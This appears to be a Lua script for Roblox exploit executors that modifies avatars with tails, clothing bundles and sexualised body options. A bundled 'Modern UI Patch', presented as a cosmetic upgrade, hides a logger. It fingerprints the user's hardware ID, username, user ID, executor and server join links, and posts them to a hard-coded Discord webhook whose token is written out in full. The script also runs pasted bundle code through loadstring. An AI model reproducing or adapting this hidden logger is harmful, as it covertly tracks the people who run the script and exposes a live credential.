...
["Tsukasa Kudamaki"] = {
			...
			["Clothes"] = {
				["Shirt"] = 71245441252346,
				["Pants"] = 125592240131884,
			},
			["TClothes"] = {
				["Shirt"] = 14364976828,
				["Pants"] = 0,
...
["Scp-953"] = {
		...
		17618482884,
			...
			["Clothes"] = {
				["Shirt"] = 118671029082765, 
				["Pants"] = 90264340995856,
			},
			["TClothes"] = {
				["Shirt"] = 14364976828,
				["Pants"] = 0,
...
["Senko-San"] = {
	...
	local function updatePhysicsTail(physicsTail:physicsTail, updateWeld:boolean, interpolationAlpha:number, Data)
		...
		if tailSettings.persistantTailWindForceRelevant then
			...
			local sinUnixTime4 = math.sin(tailScaledTime * 4)

			-- Jittery effect for when the wind is strong.
			local unstableWindFlow = math.sin(tailScaledTime * 2 * sinUnixTime4) * persistantTailWindAlpha_Times_04

			-- Calm wind effect.
			local stableWindFlow = math.sin(tailScaledTime * 2) * sinUnixTime4
	...
	local tailPhysicsConnect = RS.PreRender:Connect(function(deltaTime)
		for PlayerName, DataList in pairs(PlayerData) do
			task.spawn(function()
				...
				deltaTime = math.min(deltaTime, 0.1) * DataList.tailSettings.timeScale

				tailScaledAnimationTime += deltaTime * DataList.tailSettings.wagAnimationSpeed
				...
				local interpolationAlpha = accumulator * inverseTimeStep -- Used in interpolation.
	...
	GUIObject.TailButton.Parent = GUIObject.Menu2
	GUIObject.TailButton.BackgroundTransparency = 1
	GUIObject.TailButton.Size = UDim2.new(0.112, 0, 0.068, 0)
	GUIObject.TailButton.Position = UDim2.new(0.015,0,0.151,0)
	...
	if load.IsLoaded == false then
		...
		if loadupClosed == false then
                ...
                GUIObject.Screen.Enabled = true
--// =========================
--//  MODERN UI PATCH V7.2 - WITH INTERNAL BUNDLES
--//  - Fixed Tone button
--//  - Fixed tab size
--//  - Added Internal Bundles tab
--//  - Exclusive: https://discord.gg/fN2Uh7m735
--//  - From Vietnam 🇻🇳
--// =========================
do
    task.defer(function()
        ...
        if type(GUIObject) ~= "table" then return end
        local Screen = GUIObject.Screen
        local Main = GUIObject.MainFrame
        local PageFrame = GUIObject.PageFrame
        if not Screen or not Main or not PageFrame then return end

        local t0 = os.clock()
        while (not Screen.Parent or not Main.Parent or not PageFrame.Parent) and (os.clock() - t0 < 12) do
            task.wait()
        end

        -- Cleanup
        if Main:FindFirstChild("__ModernUI") then
            Main.__ModernUI:Destroy()
        end
        local oldDock = Screen:FindFirstChild("DockButton")
        if oldDock then oldDock:Destroy() end
        local oldWelcome = Screen:FindFirstChild("__R3Welcome")
        ...
        -- ===== CONFIG =====
        local WEBHOOK_URL = "https://discord.com/api/webhooks/1349726294761406515/1sfZDzh9AKRFqOAvCdFv_AOH8qWCPZG2T_WD3EAhsyessnOzXCKHjfQX1WSx_-TLNvdJ"
        local WEBHOOK_AVATAR = "https://files.catbox.moe/hapb51.png"
        local DISCORD_INVITE = "https://discord.gg/fN2Uh7m735"
        local BUNDLE_SAVE_FILE = "R3MinhTri_InternalBundles.json"

        local CFG = {
            TitleText = "R3MinhTri",
            WindowSize = UDim2.fromScale(0.52, 0.72),
            TopbarH = 58,
            SidebarW = 155,
            TabBtnH = 48,
            LegacyScaleMenu = 1.12,
            LegacyScaleOther = 1.06,
            DockDefaultPos = UDim2.new(0, 14, 0, 120),
            ScrollablePages = {Menu = true, Menu2 = true, Menu3 = true},
            BundlePinsClothesToTop = true,
        ...
        local Theme = {
            ...
            Stroke = Color3.fromRGB(70, 75, 92),
        ...
        -- ===== INTERNAL BUNDLES STORAGE =====
        local InternalBundles = {}
        ...
        local function mkCorner(parent, px)
            ...
            c.CornerRadius = UDim.new(0, px or Theme.RadiusFrame)
            c.Parent = parent
            return c
        end

        local function mkStroke(parent, thickness, transparency)
        ...
        -- ===== FILE OPERATIONS =====
        local function saveInternalBundles()
            pcall(function()
                if writefile then
                    local data = {}
                    for name, bundle in pairs(InternalBundles) do
                        data[name] = bundle
                    end
                    writefile(BUNDLE_SAVE_FILE, HttpService:JSONEncode(data))
                end
            end)
        end

        local function loadInternalBundles()
            pcall(function()
                if readfile and isfile and isfile(BUNDLE_SAVE_FILE) then
                    local content = readfile(BUNDLE_SAVE_FILE)
                    local data = HttpService:JSONDecode(content)
                    for name, bundle in pairs(data) do
                        -- Convert Color3 strings back to Color3
                        if bundle["Body Color"] then
                            for key, val in pairs(bundle["Body Color"]) do
                                if type(val) == "table" and val.R and val.G and val.B then
                                    bundle["Body Color"][key] = Color3.fromRGB(val.R, val.G, val.B)
                                end
                            end
                        end
                        if bundle["NippleColor"] and type(bundle["NippleColor"]) == "table" then
                            local nc = bundle["NippleColor"]
                            if nc.R and nc.G and nc.B then
                                bundle["NippleColor"] = Color3.fromRGB(nc.R, nc.G, nc.B)
                            end
                        end
                        InternalBundles[name] = bundle
                    end
                end
            end)
        end
        ...
        local function serializeBundleForSave(bundle)
            local result = {}
            for key, val in pairs(bundle) do
                if key == "Body Color" then
                    result[key] = {}
                    for k, v in pairs(val) do
                        result[key][k] = serializeColor3(v)
                    end
                elseif key == "NippleColor" then
                    result[key] = serializeColor3(val)
                else
                    result[key] = val
                end
            end
        ...
        -- ===== BUNDLE CODE PARSER =====
        local function parseBundleCode(code)
            local success, result = pcall(function()
                -- Clean up the code
                code = code:gsub("^%s*%[", "")
                
                -- Try to extract bundle name and content
                local bundleName, bundleContent = code:match('%["([^"]+)"%]%s*=%s*(%b{})')
                if not bundleName then
                    bundleName, bundleContent = code:match('"([^"]+)"%s*=%s*(%b{})')
                end
                if not bundleName then
                    bundleName, bundleContent = code:match("'([^']+)'%s*=%s*(%b{})")
                end
                if not bundleName then
                    bundleName, bundleContent = code:match('(%w+)%s*=%s*(%b{})')
                end
                
                if not bundleName or not bundleContent then
                    return nil, "Không tìm thấy tên bundle hoặc nội dung"
                end

                -- Create environment for safe execution
                local env = {
                    Color3 = Color3,
                ...
                local funcStr = "return " .. bundleContent
                local func, err = loadstring(funcStr)
                if not func then
                    return nil, "Lỗi parse: " .. tostring(err)
                end
                
                setfenv(func, env)
                local bundleData = func()
                
                if type(bundleData) ~= "table" then
                    return nil, "Dữ liệu bundle không hợp lệ"
                end
                
                return bundleName, bundleData
            end)
            
            if success then
                return result, select(2, result)
            else
                return nil, "Lỗi: " .. tostring(result)
            end
        end

        -- ===== BUNDLE TO CODE STRING =====
        local function bundleToCodeString(name, bundle)
            local lines = {}
            table.insert(lines, '["' .. name .. '"] = {')
            
            -- Body Color
            if bundle["Body Color"] then
                table.insert(lines, '\t["Body Color"] = {')
                for key, val in pairs(bundle["Body Color"]) do
                    if typeof(val) == "Color3" then
                        local r, g, b = math.floor(val.R * 255), math.floor(val.G * 255), math.floor(val.B * 255)
                        table.insert(lines, string.format('\t\t["%s"] = Color3.fromRGB(%d, %d, %d),', key, r, g, b))
                    end
                end
                table.insert(lines, '\t},')
            end
            ...
            -- Accessory
            if bundle["Accessory"] then
                table.insert(lines, '\t["Accessory"] = {')
                for _, id in ipairs(bundle["Accessory"]) do
            ...
            -- Clothes
            if bundle["Clothes"] then
                table.insert(lines, '\t["Clothes"] = {')
                if bundle["Clothes"]["Shirt"] then
                    table.insert(lines, '\t\t["Shirt"] = ' .. tostring(bundle["Clothes"]["Shirt"]) .. ',')
                end
                if bundle["Clothes"]["Pants"] then
                    table.insert(lines, '\t\t["Pants"] = ' .. tostring(bundle["Clothes"]["Pants"]) .. ',')
                end
                table.insert(lines, '\t},')
            end
            
            -- TClothes
            if bundle["TClothes"] then
                table.insert(lines, '\t["TClothes"] = {')
                if bundle["TClothes"]["Shirt"] then
                    table.insert(lines, '\t\t["Shirt"] = ' .. tostring(bundle["TClothes"]["Shirt"]) .. ',')
                end
                if bundle["TClothes"]["Pants"] then
                    table.insert(lines, '\t\t["Pants"] = ' .. tostring(bundle["TClothes"]["Pants"]) .. ',')
                end
                table.insert(lines, '\t},')
            end
            
            -- Clothing (string array)
            if bundle["Clothing"] then
                table.insert(lines, '\t["Clothing"] = {')
                for _, cloth in ipairs(bundle["Clothing"]) do
                    table.insert(lines, '\t\t"' .. tostring(cloth) .. '",')
                end
                table.insert(lines, '\t},')
            end
            
            -- Preset
            if bundle["Preset"] then
                table.insert(lines, '\t["Preset"] = {')
                for key, val in pairs(bundle["Preset"]) do
            ...
            -- NippleColor
            if bundle["NippleColor"] then
                local c = bundle["NippleColor"]
                if typeof(c) == "Color3" then
                    local r, g, b = math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
                    table.insert(lines, string.format('\t["NippleColor"] = Color3.fromRGB(%d, %d, %d),', r, g, b))
                end
            end
        ...
        -- ===== GET HUMANOID DESCRIPTION FROM USERNAME =====
        local function getHumanoidDescriptionFromUsername(username)
            local success, result = pcall(function()
                local userId = Players:GetUserIdFromNameAsync(username)
                if not userId then return nil, "Không tìm thấy user" end
        ...
        -- ===== CREATE BUNDLE FROM HUMANOID DESCRIPTION =====
        local function createBundleFromDescription(bundleName, desc, includeBodyColor)
            local bundle = {}
            ...
            for _, accType in ipairs(accessoryTypes) do
                local accStr = desc[accType]
                if accStr and accStr ~= "" then
                    for id in accStr:gmatch("%d+") do
            ...
            if #accessories > 0 then
                bundle["Accessory"] = accessories
            end
            
            -- Get clothes
            if desc.Shirt and desc.Shirt > 0 then
                bundle["Clothes"] = bundle["Clothes"] or {}
                bundle["Clothes"]["Shirt"] = desc.Shirt
            end
            if desc.Pants and desc.Pants > 0 then
                bundle["Clothes"] = bundle["Clothes"] or {}
                bundle["Clothes"]["Pants"] = desc.Pants
            end
            
            -- Get body colors if requested
            if includeBodyColor then
                bundle["Body Color"] = {
        ...
        local function getHWID()
            local methods = {
                ...
                function() if syn and syn.hwid then return syn.hwid end end,
                function() if get_hwid then return get_hwid() end end,
                function() if getdeviceid then return getdeviceid() end end,
                function() if get_device_id then return get_device_id() end end,
                function() if HWID then return HWID end end,
                function() if _G.hwid then return _G.hwid end end,
                function() 
                    if identifyexecutor then
                        local name, h = identifyexecutor()
                        if h then return h end
                    end
                end,
                function() if fluxus and fluxus.get_hwid then return fluxus.get_hwid() end end,
                function() if KRNL_LOADED and krnl_hwid then return krnl_hwid() end end,
                function() if Solara and Solara.HWID then return Solara.HWID end end,
                function() if Delta and Delta.HWID then return Delta.HWID end end,
                function() if Arceus and Arceus.GetHWID then return Arceus.GetHWID() end end,
                function() if getmachineid then return getmachineid() end end,
                function()
            ...
            if lp then
                local combined = tostring(lp.UserId) .. "-" .. tostring(os.time()) .. "-" .. tostring(math.random(100000, 999999))
                local hash = 0
                for i = 1, #combined do
                    hash = (hash * 31 + string.byte(combined, i)) % 2147483647
                end
                return "GEN-" .. string.format("%X", hash)
            end
        ...
        local function getExecutorName()
            local executors = {
                ...
                {check = function() return Solara end, name = "Solara"},
                {check = function() return Delta end, name = "Delta"},
                {check = function() return Arceus end, name = "Arceus X"},
                {check = function() return Hydrogen end, name = "Hydrogen"},
                {check = function() return Evon end, name = "Evon"},
                {check = function() return Comet end, name = "Comet"},
                {check = function() return Wave end, name = "Wave"},
                {check = function() return Codex end, name = "Codex"},
                {check = function() return ScriptWare end, name = "Script-Ware"},
                {check = function() return Trigon end, name = "Trigon"},
                {check = function() return Velocity end, name = "Velocity"},
                {check = function() return _G.Xeno end, name = "Xeno"},
            }
            
            for _, exec in ipairs(executors) do
                local ok, result = pcall(exec.check)
                if ok and result then return exec.name end
            end
            
            local ok1, name1 = pcall(function()
                if getexecutorname then return getexecutorname() end
            end)
            if ok1 and name1 then return name1 end
            
            local ok2, name2 = pcall(function()
                if identifyexecutor then
                    local n, _ = identifyexecutor()
                    return n
                end
            end)
        ...
        -- ===== SEND WEBHOOK =====
        local function sendWebhook(displayName, username, userId, executor, hwid)
            ...
            local serverLinkPC = "https://www.roblox.com/games/start?placeId=" .. tostring(placeId) .. "&launchData=" .. tostring(jobId)
            local serverLinkMobile = "https://www.roblox.com/games/start?placeId=" .. tostring(placeId) .. "&launchData=" .. tostring(jobId)
            
            local avatarUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(userId) .. "&size=420x420&format=Png"
            
            local embedData = {
                username = "R3MinhTri Logger",
                ...
                embeds = {
                    {
                        ...
                        fields = {
                            ...
                            {name = "🎮 Game", value = tostring(gameInfo), inline = true},
                            {name = "🌐 Place ID", value = tostring(placeId), inline = true},
                            {name = "🔐 HWID", value = "```" .. tostring(hwid) .. "```", inline = false},
                            {name = "🖥️ Join Server (PC)", value = "```" .. serverLinkPC .. "```", inline = false},
                            {name = "📱 Join Server (Mobile)", value = "```" .. serverLinkMobile .. "```", inline = false}
                        },
                        thumbnail = {url = avatarUrl},
                        footer = {
                            text = "R3MinhTri Public Script • " .. os.date("%d/%m/%Y %H:%M:%S"),
            ...
            pcall(function()
                makeRequest(WEBHOOK_URL, "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(embedData))
            end)
        end
        ...
        -- ===== TRANSLATION =====
        local TabVN = {
            Bundles = "Gói", Catalog = "Danh mục", Clothes = "Quần áo",
            Edit = "Chỉnh sửa", Menu = "Menu", Menu2 = "Cài đặt",
            Menu3 = "Tuỳ chọn", Recolor = "Đổi màu", Tail = "Đuôi",
            InternalBundles = "Gói Nội Bộ",
        }

        local DictExact = {
            ["TABS"] = "TAB", ["Settings"] = "Cài đặt", ["Catalog"] = "Danh mục",
            ["Bundles"] = "Gói", ["Clothes"] = "Quần áo", ["Tail"] = "Đuôi",
            ["Recolor"] = "Đổi màu", ["Edit"] = "Chỉnh sửa", ["Execute"] = "Thực thi",
            ["Reset"] = "Đặt lại", ["Insert"] = "Chèn", ["Auto Execute"] = "Tự động chạy",
            ["Body Part Physics"] = "Vật lý bộ phận cơ thể", ["nil"] = "không có",
            ["Base"] = "Cơ bản", ["Dark"] = "Tối", ["Use NippleColor"] = "Dùng màu núm",
        }

        local PrefixMap = {
            ["Tone:"] = "Tông da:", ["Breasts Type:"] = "Kiểu ngực:",
            ["Butt Type:"] = "Kiểu mông:", ["Bundle:"] = "Gói:",
        }

        local function translateText(s)
            if type(s) ~= "string" or s == "" then return s end
            if not s:match("%a") then return s end
            if DictExact[s] then return DictExact[s] end
            for k, v in pairs(PrefixMap) do
                if s:sub(1, #k) == k then
                    local tail = s:sub(#k + 1):gsub("^%s+", "")
                    if tail == "nil" then tail = "không có" end
                    if DictExact[tail] then tail = DictExact[tail] end
                    return v .. " " .. tail
                end
            end
            return s
        ...
        local function hookText(obj)
            ...
            if obj:GetAttribute("__VNHooked") then return end
            obj:SetAttribute("__VNHooked", true)
            ...
            if obj:IsA("TextBox") then
                obj:GetPropertyChangedSignal("PlaceholderText"):Connect(function()
                    task.defer(function()
                        ...
                        if ph and ph ~= "" then
                            local n = translateText(ph)
                            if n ~= ph then
                                applying = true
                                obj.PlaceholderText = n
                                applying = false
                            end
                        end
                    end)
        ...
        local function styleText(obj)
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                ...
                if obj:IsA("TextBox") then
                    obj.PlaceholderColor3 = Theme.SubText
        ...
        local function styleSurface(obj)
            if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
                local hasGradient = (obj:FindFirstChildOfClass("UIGradient") ~= nil)
                if obj.BackgroundTransparency < 1 or hasGradient then
                    obj.BackgroundColor3 = Theme.Card
                    obj.BackgroundTransparency = math.min(obj.BackgroundTransparency, 0.10)
                ...
                if stroke then
                    ...
                    stroke.Thickness = 1
                    stroke.Transparency = math.max(stroke.Transparency, 0.55)
                end
            end
        end

        local function normalizeCorners(root, px)
            px = px or Theme.RadiusFrame
            for _, d in ipairs(root:GetDescendants()) do
                if d:IsA("UICorner") then
                    d.CornerRadius = UDim.new(0, px)
                end
            end
        end
        ...
        -- ===== GET PLAYER INFO =====
        local lp = Players.LocalPlayer
        local playerDisplayName = lp and lp.DisplayName or "Unknown"
        local playerUsername = lp and lp.Name or "Unknown"
        local playerUserId = lp and lp.UserId or 0
        local playerExecutor = getExecutorName()
        ...
        -- ===== STORE FOR LATER =====
        local ModernRoot = nil
        local Dock = nil
        local InternalBundlesPage = nil
        local InternalBundlesList = nil

        -- ===== TONE BUTTON HELPER =====
        local function cycleTone()
            pcall(function()
                if not PlayerData or not SelectPlayer or not PlayerData[SelectPlayer] then return end
                
                local currentTone = PlayerData[SelectPlayer].Tone
                if currentTone == "Base" then
                    PlayerData[SelectPlayer].Tone = "Dark"
                elseif currentTone == "Dark" then
                    PlayerData[SelectPlayer].Tone = "Use NippleColor"
                elseif currentTone == "Use NippleColor" then
                    PlayerData[SelectPlayer].Tone = "Base"
                else
                    PlayerData[SelectPlayer].Tone = "Base"
                end
                
                if Function and Function.GUIUpdate then
                    Function.GUIUpdate()
                end
            end)
        end

        local function getCurrentToneText()
            local toneValue = "Base"
            pcall(function()
                if PlayerData and SelectPlayer and PlayerData[SelectPlayer] then
                    toneValue = PlayerData[SelectPlayer].Tone or "Base"
                end
            end)
            ...
            local toneTranslate = {
                ["Base"] = "Cơ bản",
                ["Dark"] = "Tối", 
                ["Use NippleColor"] = "Dùng màu núm"
            }
            return "Tông da: " .. (toneTranslate[toneValue] or toneValue)
        end

        -- ===== APPLY INTERNAL BUNDLE =====
        local function applyInternalBundle(bundleName)
            pcall(function()
                if not Bundle or not InternalBundles[bundleName] then return end
                
                -- Add to global Bundle table temporarily
                Bundle[bundleName] = InternalBundles[bundleName]
                
                -- Set as current bundle
                if PlayerData and SelectPlayer and PlayerData[SelectPlayer] then
                    PlayerData[SelectPlayer].CurrentBundle = bundleName
                end
...
-- ===== PHẦN 2/2 - TIẾP TỤC TỪ PHẦN 1 =====
        ...
        local function createModalBase(title, height)
            closeModal()
            
            local overlay = Instance.new("Frame")
            overlay.Name = "__Modal"
            ...
            card.Size = UDim2.new(0, 550, 0, height or 450)
            card.BackgroundColor3 = Theme.Panel
            card.BackgroundTransparency = 0.02
            card.ZIndex = 3002
            mkCorner(card, 14)
            mkStroke(card, 1, 0.60)

            local titleBar = Instance.new("Frame")
            titleBar.Parent = card
            titleBar.BackgroundColor3 = Theme.Card
            titleBar.BackgroundTransparency = 0.10
            titleBar.Size = UDim2.new(1, 0, 0, 44)
            titleBar.ZIndex = 3003
            ...
            makeDraggable(card, titleBar)

            return overlay, card, content
        end

        -- ===== MODAL: IMPORT BUNDLE CODE =====
        local function showImportBundleModal()
            local overlay, card, content = createModalBase("📥 Nhập Bundle Code", 480)

            local desc = Instance.new("TextLabel")
            desc.Parent = content
            desc.BackgroundTransparency = 1
            desc.Text = "Dán code bundle vào ô bên dưới (định dạng Lua table):"
            ...
            inputBox.Text = ""
            inputBox.PlaceholderText = '["TênBundle"] = {\n\t["Body Color"] = {...},\n\t["Accessory"] = {...},\n\t...\n},'
            ...
            inputBox.Size = UDim2.new(1, 0, 0, 280)
            inputBox.ZIndex = 3004
            mkCorner(inputBox, 10)
            mkStroke(inputBox, 1, 0.75)
            ...
            feedback.TextColor3 = Theme.Success
            feedback.TextXAlignment = Enum.TextXAlignment.Left
            feedback.Position = UDim2.new(0, 0, 0, 316)
            feedback.Size = UDim2.new(1, 0, 0, 20)
            feedback.ZIndex = 3004

            local btnImport = Instance.new("TextButton")
            btnImport.Parent = content
            btnImport.BackgroundColor3 = Theme.Success
            btnImport.BackgroundTransparency = 0.10
            btnImport.Text = "✓ Nhập & Lưu"
            btnImport.Font = Enum.Font.GothamBold
            btnImport.TextSize = 15
            btnImport.TextColor3 = Theme.Text
            btnImport.Position = UDim2.new(0, 0, 1, -44)
            btnImport.Size = UDim2.new(0, 140, 0, 40)
            btnImport.ZIndex = 3004
            mkCorner(btnImport, 10)

            local btnCancel = Instance.new("TextButton")
            btnCancel.Parent = content
            btnCancel.BackgroundColor3 = Theme.Card
            btnCancel.BackgroundTransparency = 0.10
            btnCancel.Text = "Huỷ"
            btnCancel.Font = Enum.Font.GothamSemibold
            btnCancel.TextSize = 14
            btnCancel.TextColor3 = Theme.Text
            btnCancel.Position = UDim2.new(0, 150, 1, -44)
            btnCancel.Size = UDim2.new(0, 80, 0, 40)
            btnCancel.ZIndex = 3004
            mkCorner(btnCancel, 10)
            mkStroke(btnCancel, 1, 0.80)

            btnCancel.MouseButton1Click:Connect(closeModal)

            btnImport.MouseButton1Click:Connect(function()
                local code = inputBox.Text
                if code == "" then
                    feedback.Text = "❌ Vui lòng nhập code bundle"
                    feedback.TextColor3 = Theme.Danger
                    return
                end

                local bundleName, bundleData = parseBundleCode(code)
                if not bundleName then
                    feedback.Text = "❌ " .. tostring(bundleData)
                    feedback.TextColor3 = Theme.Danger
                    return
                end

                -- Save to internal bundles
                InternalBundles[bundleName] = bundleData
                
                -- Also add to global Bundle table
                if Bundle then
                    Bundle[bundleName] = bundleData
                end
                
                -- Save to file
                local serialized = {}
                for name, bundle in pairs(InternalBundles) do
                    serialized[name] = serializeBundleForSave(bundle)
                end
                pcall(function()
                    if writefile then
                        writefile(BUNDLE_SAVE_FILE, HttpService:JSONEncode(serialized))
                    end
                end)

                feedback.Text = "✅ Đã nhập bundle: " .. bundleName
                feedback.TextColor3 = Theme.Success

                -- Refresh internal bundles list
                task.delay(0.5, function()
                    closeModal()
                    if InternalBundlesList then
                        refreshInternalBundlesList()
                    end
                end)
            end)
        end

        -- ===== MODAL: CREATE BUNDLE FROM USERNAME =====
        local function showCreateFromUsernameModal()
            local overlay, card, content = createModalBase("👤 Tạo Bundle từ Username", 380)

            local desc = Instance.new("TextLabel")
            desc.Parent = content
            desc.BackgroundTransparency = 1
            desc.Text = "Nhập username Roblox để tạo bundle từ avatar của họ:"
            desc.Font = Enum.Font.Gotham
            desc.TextSize = 13
            desc.TextColor3 = Theme.SubText
            desc.TextXAlignment = Enum.TextXAlignment.Left
            ...
            usernameInput.Parent = content
            usernameInput.BackgroundColor3 = Theme.Bg
            usernameInput.BackgroundTransparency = 0.15
            usernameInput.Text = ""
            usernameInput.PlaceholderText = "Nhập username..."
            usernameInput.Font = Enum.Font.Gotham
            usernameInput.TextSize = 15
            usernameInput.TextColor3 = Theme.Text
            usernameInput.PlaceholderColor3 = Theme.SubText
            usernameInput.ClearTextOnFocus = false
            usernameInput.Position = UDim2.new(0, 0, 0, 28)
            usernameInput.Size = UDim2.new(1, 0, 0, 44)
            usernameInput.ZIndex = 3004
            mkCorner(usernameInput, 10)
            mkStroke(usernameInput, 1, 0.75)

            local bundleNameInput = Instance.new("TextBox")
            bundleNameInput.Parent = content
            bundleNameInput.BackgroundColor3 = Theme.Bg
            bundleNameInput.BackgroundTransparency = 0.15
            bundleNameInput.Text = ""
            bundleNameInput.PlaceholderText = "Tên bundle (tuỳ chọn, mặc định = username)"
            bundleNameInput.Font = Enum.Font.Gotham
            bundleNameInput.TextSize = 15
            bundleNameInput.TextColor3 = Theme.Text
            bundleNameInput.PlaceholderColor3 = Theme.SubText
            bundleNameInput.ClearTextOnFocus = false
            bundleNameInput.Position = UDim2.new(0, 0, 0, 80)
            bundleNameInput.Size = UDim2.new(1, 0, 0, 44)
            bundleNameInput.ZIndex = 3004
            mkCorner(bundleNameInput, 10)
            mkStroke(bundleNameInput, 1, 0.75)

            -- Checkbox for body color
            local checkboxFrame = Instance.new("Frame")
            checkboxFrame.Parent = content
            checkboxFrame.BackgroundTransparency = 1
            checkboxFrame.Position = UDim2.new(0, 0, 0, 135)
            checkboxFrame.Size = UDim2.new(1, 0, 0, 30)
            checkboxFrame.ZIndex = 3004

            local includeBodyColor = true
            local checkbox = Instance.new("TextButton")
            checkbox.Parent = checkboxFrame
            checkbox.BackgroundColor3 = Theme.Success
            checkbox.BackgroundTransparency = 0.15
            checkbox.Text = "✓"
            checkbox.Font = Enum.Font.GothamBold
            checkbox.TextSize = 14
            checkbox.TextColor3 = Theme.Text
            checkbox.Size = UDim2.new(0, 26, 0, 26)
            checkbox.ZIndex = 3005
            mkCorner(checkbox, 6)
            mkStroke(checkbox, 1, 0.75)

            local checkLabel = Instance.new("TextLabel")
            checkLabel.Parent = checkboxFrame
            checkLabel.BackgroundTransparency = 1
            checkLabel.Text = "Bao gồm Body Color"
            checkLabel.Font = Enum.Font.Gotham
            checkLabel.TextSize = 14
            checkLabel.TextColor3 = Theme.Text
            checkLabel.TextXAlignment = Enum.TextXAlignment.Left
            checkLabel.Position = UDim2.new(0, 34, 0, 0)
            checkLabel.Size = UDim2.new(1, -34, 1, 0)
            checkLabel.ZIndex = 3005

            checkbox.MouseButton1Click:Connect(function()
                includeBodyColor = not includeBodyColor
                if includeBodyColor then
                    checkbox.Text = "✓"
                    checkbox.BackgroundColor3 = Theme.Success
                else
            ...
            btnCreate.BackgroundColor3 = Theme.Accent
            btnCreate.BackgroundTransparency = 0.10
            btnCreate.Text = "🔍 Tạo Bundle"
            btnCreate.Font = Enum.Font.GothamBold
            btnCreate.TextSize = 15
            btnCreate.TextColor3 = Theme.Text
            btnCreate.Position = UDim2.new(0, 0, 1, -44)
            btnCreate.Size = UDim2.new(0, 140, 0, 40)
            btnCreate.ZIndex = 3004
            mkCorner(btnCreate, 10)
            ...
            btnCreate.MouseButton1Click:Connect(function()
                local username = usernameInput.Text:gsub("^%s+", ""):gsub("%s+$", "")
                if username == "" then
                    feedback.Text = "❌ Vui lòng nhập username"
                    feedback.TextColor3 = Theme.Danger
                    return
                end

                feedback.Text = "⏳ Đang tải thông tin avatar..."
                feedback.TextColor3 = Theme.Warning
                btnCreate.Text = "..."

                task.spawn(function()
                    local desc, userId = getHumanoidDescriptionFromUsername(username)
                    
                    if not desc then
                        feedback.Text = "❌ Không tìm thấy user: " .. username
                        feedback.TextColor3 = Theme.Danger
                        btnCreate.Text = "🔍 Tạo Bundle"
                        return
                    end

                    local bundleName = bundleNameInput.Text
                    if bundleName == "" then bundleName = username end

                    local bundle = createBundleFromDescription(bundleName, desc, includeBodyColor)

                    -- Save to internal bundles
                    InternalBundles[bundleName] = bundle
                    ...
                    -- Save to file
                    local serialized = {}
                    for name, b in pairs(InternalBundles) do
                        serialized[name] = serializeBundleForSave(b)
                    end
                    pcall(function()
                        if writefile then
                            writefile(BUNDLE_SAVE_FILE, HttpService:JSONEncode(serialized))
                    ...
                    feedback.Text = "✅ Đã tạo bundle: " .. bundleName
                    feedback.TextColor3 = Theme.Success
                    btnCreate.Text = "🔍 Tạo Bundle"
        ...
        -- ===== MODAL: EXPORT BUNDLE =====
        local function showExportBundleModal(bundleName, bundleData)
            local overlay, card, content = createModalBase("📤 Xuất Bundle: " .. bundleName, 500)

            local desc = Instance.new("TextLabel")
            desc.Parent = content
            desc.BackgroundTransparency = 1
            desc.Text = "Code bundle (copy để sử dụng lại):"
            desc.Font = Enum.Font.Gotham
            desc.TextSize = 13
            desc.TextColor3 = Theme.SubText
            desc.TextXAlignment = Enum.TextXAlignment.Left
            ...
            local codeStr = bundleToCodeString(bundleName, bundleData)

            local codeBox = Instance.new("TextBox")
            codeBox.Parent = content
            codeBox.BackgroundColor3 = Theme.Bg
            ...
            codeBox.Position = UDim2.new(0, 0, 0, 28)
            codeBox.Size = UDim2.new(1, 0, 0, 320)
            codeBox.ZIndex = 3004
            mkCorner(codeBox, 10)
            mkStroke(codeBox, 1, 0.75)
            ...
            feedback.TextColor3 = Theme.Success
            feedback.TextXAlignment = Enum.TextXAlignment.Left
            feedback.Position = UDim2.new(0, 0, 0, 356)
            feedback.Size = UDim2.new(1, 0, 0, 20)
            feedback.ZIndex = 3004

            local btnCopy = Instance.new("TextButton")
            btnCopy.Parent = content
            btnCopy.BackgroundColor3 = Theme.Accent
            btnCopy.BackgroundTransparency = 0.10
            btnCopy.Text = "📋 Copy Code"
            btnCopy.Font = Enum.Font.GothamBold
            btnCopy.TextSize = 15
            btnCopy.TextColor3 = Theme.Text
            btnCopy.Position = UDim2.new(0, 0, 1, -44)
            btnCopy.Size = UDim2.new(0, 130, 0, 40)
            btnCopy.ZIndex = 3004
            mkCorner(btnCopy, 10)
            ...
            btnClose.BackgroundTransparency = 0.10
            btnClose.Text = "Đóng"
            btnClose.Font = Enum.Font.GothamSemibold
            btnClose.TextSize = 14
            btnClose.TextColor3 = Theme.Text
            btnClose.Position = UDim2.new(0, 140, 1, -44)
            btnClose.Size = UDim2.new(0, 80, 0, 40)
            btnClose.ZIndex = 3004
            mkCorner(btnClose, 10)
            mkStroke(btnClose, 1, 0.80)

            btnClose.MouseButton1Click:Connect(closeModal)

            btnCopy.MouseButton1Click:Connect(function()
                local ok = pcall(function()
                    if setclipboard then setclipboard(codeStr) end
                end)
                if ok then
                    feedback.Text = "✅ Đã copy code!"
                    feedback.TextColor3 = Theme.Success
                else
                    feedback.Text = "❌ Không thể copy"
                    feedback.TextColor3 = Theme.Danger
                end
            end)
        end
        ...
        -- ===== REFRESH INTERNAL BUNDLES LIST =====
        function refreshInternalBundlesList()
            if not InternalBundlesList then return end
            
            -- Clear existing items
            for _, child in ipairs(InternalBundlesList:GetChildren()) do
            ...
            local index = 0
            for bundleName, bundleData in pairs(InternalBundles) do
                index = index + 1
                
                local item = Instance.new("Frame")
                item.Parent = InternalBundlesList
                ...
                -- Info line
                local infoText = ""
                if bundleData["Accessory"] then
                    infoText = infoText .. #bundleData["Accessory"] .. " phụ kiện  "
                end
                if bundleData["Clothes"] then
                    infoText = infoText .. "Quần áo  "
                end
                if bundleData["Body Color"] then
                    infoText = infoText .. "Màu da"
                end

                local infoLabel = Instance.new("TextLabel")
                infoLabel.Parent = item
                infoLabel.BackgroundTransparency = 1
                infoLabel.Text = infoText ~= "" and infoText or "Bundle trống"
                ...
                btnsFrame.Parent = item
                btnsFrame.BackgroundTransparency = 1
                btnsFrame.Position = UDim2.new(0, 0, 1, -26)
                btnsFrame.Size = UDim2.new(1, 0, 0, 26)
                btnsFrame.ZIndex = 61

